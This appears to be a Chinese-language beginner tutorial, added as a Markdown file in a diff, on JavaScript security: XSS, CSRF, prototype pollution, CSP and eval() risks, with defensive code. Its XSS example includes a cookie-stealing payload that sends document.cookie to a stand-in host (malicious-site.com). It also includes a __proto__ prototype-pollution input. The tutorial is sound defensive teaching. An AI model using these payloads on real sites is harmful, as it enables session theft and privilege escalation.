@@ -1,0 +1,342 @@
+---
+title: JavaScript 安全基础
+description: 本文介绍JavaScript安全的基础知识，包括常见的安全威胁、防御措施以及最佳实践，帮助初学者了解如何编写安全的JavaScript代码。
+---
+
+# JavaScript 安全基础
+
+## 介绍
+
+随着Web应用程序在我们日常生活中扮演越来越重要的角色，JavaScript作为Web前端的核心语言，其安全性变得尤为重要。不安全的JavaScript代码可能会导致个人信息泄露、数据被篡改或网站功能被破坏。本文将介绍JavaScript安全的基础知识，帮助初学者了解常见的安全威胁以及如何防御这些威胁。
+
+## 为什么JavaScript安全很重要？
+
+JavaScript在浏览器中运行，可以访问用户的数据、与服务器通信，甚至修改网页内容。如果不注重安全性，您的应用程序可能会面临以下风险：
+
+1. 用户敏感信息被盗取
+2. 网站功能被恶意篡改
+3. 用户被重定向到钓鱼网站
+4. 网站被用于攻击其他用户或系统
+
+## 常见的JavaScript安全威胁
+
+### 1. 跨站脚本攻击(XSS)
+
+跨站脚本攻击是最常见的JavaScript安全威胁之一。攻击者通过在网页上注入恶意脚本，使这些脚本在用户的浏览器中执行。
+
+#### 示例：
+
+假设一个网站有一个评论功能，用户输入直接显示在页面上：
+
+```javascript
+// 不安全的代码
+document.getElementById('comments').innerHTML = userInput;
+```
+
+如果用户输入：
+```html
+<script>document.location='http://malicious-site.com/?cookie='+document.cookie</script>
+```
+
+这段代码会被执行，将用户的cookie发送到恶意网站。
+
+#### 防御措施：
+
+1. **输入验证和净化**
+
+```javascript
+// 使用DOMPurify库净化用户输入
+import DOMPurify from 'dompurify';
+
+const userInput = "<script>alert('XSS')</script>";
+const sanitizedInput = DOMPurify.sanitize(userInput);
+document.getElementById('comments').innerHTML = sanitizedInput;
+// 输出将是空字符串或安全的HTML
+```
+
+2. **使用textContent而非innerHTML**
+
+```javascript
+// 安全的代码
+document.getElementById('comments').textContent = userInput;
+// 即使用户输入是恶意脚本，也会被作为文本显示，不会执行
+```
+
+### 2. 跨站请求伪造(CSRF)
+
+CSRF攻击利用用户已经登录的状态，在用户不知情的情况下执行未授权的操作。
+
+#### 防御措施：
+
+1. **使用CSRF令牌**
+
+```javascript
+// 在发送请求时包含CSRF令牌
+const csrfToken = document.querySelector('meta[name="csrf-token"]').getAttribute('content');
+
+fetch('/api/update-profile', {
+  method: 'POST',
+  headers: {
+    'Content-Type': 'application/json',
+    'X-CSRF-Token': csrfToken
+  },
+  body: JSON.stringify(data)
+});
+```
+
+2. **验证请求来源**
+
+```javascript
+// 在服务器端检查Referer和Origin头
+// 前端无法控制这些头的值，所以这是服务器端的防御措施
+```
+
+### 3. 原型污染
+
+JavaScript的原型链机制可能被攻击者利用，通过修改对象的原型来影响应用程序的行为。
+
+#### 示例：
+
+```javascript
+// 不安全的代码
+function mergeObjects(target, source) {
+  for (let key in source) {
+    if (typeof source[key] === 'object') {
+      target[key] = mergeObjects(target[key] || {}, source[key]);
+    } else {
+      target[key] = source[key];
+    }
+  }
+  return target;
+}
+
+// 如果用户提供如下输入
+const userInput = JSON.parse('{"__proto__": {"isAdmin": true}}');
+const config = {};
+
+mergeObjects(config, userInput);
+
+// 现在所有对象的isAdmin属性都是true
+console.log({}.isAdmin); // true
+```
+
+#### 防御措施：
+
+```javascript
+// 安全的代码
+function mergeObjects(target, source) {
+  for (let key in source) {
+    // 跳过__proto__和constructor
+    if (key === '__proto__' || key === 'constructor') continue;
+    
+    if (typeof source[key] === 'object') {
+      target[key] = mergeObjects(target[key] || {}, source[key]);
+    } else {
+      target[key] = source[key];
+    }
+  }
+  return target;
+}
+```
+
+:::warning
+永远不要直接将用户输入作为对象的键或值，除非你已经经过严格的验证和净化。
+:::
+
+## 安全最佳实践
+
+### 1. 内容安全策略(CSP)
+
+内容安全策略是一种额外的安全层，可以检测和减轻某些类型的攻击，如XSS和数据注入攻击。
+
+```html
+<!-- 在HTML头部添加CSP -->
+<meta http-equiv="Content-Security-Policy" content="default-src 'self'; script-src 'self'">
+```
+
+这个策略只允许从同一来源加载脚本，从而防止大多数XSS攻击。
+
+### 2. 使用HTTPS
+
+始终使用HTTPS来保护数据传输，防止中间人攻击。
+
+```javascript
+// 检查是否使用HTTPS
+if (window.location.protocol !== 'https:') {
+  console.warn('当前页面不是通过HTTPS加载的，可能存在安全风险');
+}
+```
+
+### 3. 避免使用eval()
+
+`eval()`函数可以执行任意JavaScript代码，这是一个严重的安全风险点。
+
+```javascript
+// 不安全的代码
+function calculateFromUserInput(userInput) {
+  return eval(userInput); // 危险！
+}
+
+// 安全的替代方案
+function calculateFromUserInput(userInput) {
+  // 使用正则表达式验证输入是否仅包含数字和算术运算符
+  if (/^[0-9+\-*/().]+$/.test(userInput)) {
+    return Function('"use strict";return (' + userInput + ')')();
+  } else {
+    throw new Error("Invalid input");
+  }
+}
+
+// 或者更好的方法是使用专门的数学表达式解析库
+```
+
+:::caution
+即使使用了Function构造函数，仍然需要谨慎验证输入，因为它与eval有类似的安全风险。
+:::
+
+### 4. 处理JSON数据
+
+当使用`JSON.parse()`解析不可信的数据时，需要进行错误处理：
+
+```javascript
+try {
+  const data = JSON.parse(userProvidedString);
+  // 继续处理数据
+} catch (e) {
+  console.error("Invalid JSON:", e);
+  // 适当地处理错误
+}
+```
+
+## 实际案例：构建安全的表单提交
+
+以下是一个包含安全措施的表单提交示例：
+
+```javascript
+document.addEventListener('DOMContentLoaded', () => {
+  const form = document.getElementById('userForm');
+  
+  form.addEventListener('submit', async (e) => {
+    e.preventDefault();
+    
+    // 1. 获取表单数据
+    const formData = new FormData(form);
+    const userData = {};
+    
+    // 2. 验证和净化数据
+    for (let [key, value] of formData.entries()) {
+      // 基本的XSS防护 - 实际应用中应使用更强大的库
+      value = value.replace(/</g, '&lt;').replace(/>/g, '&gt;');
+      
+      // 验证电子邮件
+      if (key === 'email' && !/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(value)) {
+        showError('请输入有效的电子邮件地址');
+        return;
+      }
+      
+      userData[key] = value;
+    }
+    
+    // 3. 添加CSRF令牌
+    const csrfToken = document.querySelector('meta[name="csrf-token"]').getAttribute('content');
+    
+    try {
+      // 4. 使用安全的方式发送请求
+      const response = await fetch('/api/user/update', {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json',
+          'X-CSRF-Token': csrfToken
+        },
+        body: JSON.stringify(userData),
+        credentials: 'same-origin' // 包含cookies
+      });
+      
+      if (!response.ok) {
+        throw new Error('请求失败');
+      }
+      
+      const result = await response.json();
+      showSuccess('用户信息已更新');
+      
+    } catch (error) {
+      console.error('错误:', error);
+      showError('提交表单时出错');
+    }
+  });
+  
+  function showError(message) {
+    const errorDiv = document.getElementById('errorMessage');
+    errorDiv.textContent = message;
+    errorDiv.style.display = 'block';
+  }
+  
+  function showSuccess(message) {
+    const successDiv = document.getElementById('successMessage');
+    successDiv.textContent = message;
+    successDiv.style.display = 'block';
+  }
+});
+```
+
+## JavaScript 安全自测问题
+
+下面是一些安全问题，测试您对JavaScript安全的理解：
+
+1. 下面的代码有什么安全问题？
+   ```javascript
+   const userInput = document.getElementById('search').value;
+   document.getElementById('results').innerHTML = userInput;
+   ```
+
+2. 以下代码为什么不安全？
+   ```javascript
+   const userData = JSON.parse(userInput);
+   Object.assign(config, userData);
+   ```
+
+3. 当执行AJAX请求时，如何防止CSRF攻击？
+
+:::tip
+将这些问题作为自我检查，确保您理解了本文介绍的安全概念。
+:::
+
+## 安全工具和资源
+
+在开发过程中，您可以使用以下工具和资源来确保您的JavaScript代码安全：
+
+1. **静态分析工具**：ESLint的安全插件可以检测常见的安全问题
+2. **DOMPurify**：用于HTML净化，防止XSS攻击
+3. **helmet**：Node.js安全中间件，可设置各种HTTP头
+4. **OWASP (开放式Web应用程序安全项目)**：提供有关Web安全的最佳实践和指南
+
+## 总结
+
+JavaScript安全是一个广泛且重要的主题。本文介绍了最常见的JavaScript安全威胁以及防御这些威胁的基本技术。记住以下关键点：
+
+- 始终验证和净化用户输入
+- 使用适当的内容安全策略(CSP)
+- 避免使用危险的函数如`eval()`
+- 实施CSRF保护措施
+- 保持依赖库的更新
+- 了解常见的攻击方式
+
+虽然没有100%安全的系统，但通过遵循这些最佳实践，您可以显著提高应用程序的安全性，保护用户数据和系统完整性。
+
+## 练习
+
+1. 创建一个简单的表单，实施输入验证和XSS防护。
+2. 审查您现有的代码，检查是否有使用`innerHTML`或`eval()`的不安全代码。
+3. 为您的网站制定内容安全策略。
+4. 实现CSRF令牌验证。
+
+随着您继续学习和实践，不断审查和更新您对JavaScript安全的理解将帮助您构建更加安全的应用程序。
+
+## 附加资源
+
+- [OWASP Top Ten](https://owasp.org/www-project-top-ten/)
+- [Mozilla开发者网络 (MDN) - Web安全](https://developer.mozilla.org/zh-CN/docs/Web/Security)
+- [Content Security Policy 参考](https://content-security-policy.com/)
+- [JavaScript安全最佳实践](https://cheatsheetseries.owasp.org/cheatsheets/JavaScript_Security_Cheat_Sheet.html)
+
+无论您是构建小型个人项目还是大型企业应用，这些安全基础知识都将帮助您创建更加安全的JavaScript代码。
